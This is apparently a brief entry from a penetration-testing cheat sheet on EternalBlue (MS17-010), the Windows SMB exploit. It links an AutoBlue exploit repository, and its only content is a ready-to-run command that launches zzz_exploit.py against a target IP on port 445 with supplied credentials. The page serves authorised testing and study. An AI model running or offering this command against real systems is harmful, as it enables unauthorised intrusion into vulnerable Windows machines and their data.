---
title: EternalBlue
desc: Exploits Microsoft's SMB protocol. Also known as MS17-010.
tags: [SMB, Windows]
alts: [RapidTables]
website: https://github.com/3ndG4me/AutoBlue-MS17-010
render_with_liquid: false
---

```sh
# Basic
python zzz_exploit.py -target-ip 10.0.0.1 -port 445 'username:password@target'
```